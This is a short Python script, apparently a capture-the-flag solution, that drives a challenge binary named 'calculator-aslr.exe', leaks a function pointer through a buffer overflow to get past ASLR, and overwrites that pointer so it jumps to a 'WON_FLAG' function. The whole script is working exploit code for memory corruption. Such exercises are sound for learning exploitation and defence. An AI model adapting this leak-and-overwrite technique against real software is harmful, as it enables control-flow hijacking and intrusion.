from subprocess import Popen, PIPE, STDOUT
from struct import pack, unpack

BUFFER_SIZE = 32
ADDRESS_OFFSET = 49
CHARS_TO_RET = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIII'
WON_FLAG_ADDR = 0x004011B0
ADD_ADDR = 0x004011A0
OFFSET = WON_FLAG_ADDR - ADD_ADDR

p = Popen(['calculator-aslr.exe'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)

def read():
    return p.stdout.readline()

def write(s):
    p.stdin.write(s)
    p.stdin.flush()

read(); read()
print("Setting function pointer to ADD")
write(b'1+2\n')
read(); read(); read()

print("Overflowing to get function pointer to ADD")
write(b'A' * BUFFER_SIZE + b'\n')
address = read()[ADDRESS_OFFSET:ADDRESS_OFFSET+4].rstrip()
address += b'\x00' * (4 - len(address))
read(); read(); read()
value_addr = unpack('I', address)[0]
print("Address of ADD:", ' '.join(hex(n) for n in address[::-1]))
win_flag = value_addr + OFFSET
addr_win = pack('I', win_flag)
print("Address of WON_FLAG:", ' '.join(hex(n) for n in addr_win[::-1]))
print("Overflowing to get function pointer to WON_FLAG")
write(CHARS_TO_RET + addr_win + b'\n')

read(); read()
print(read())

p.kill()
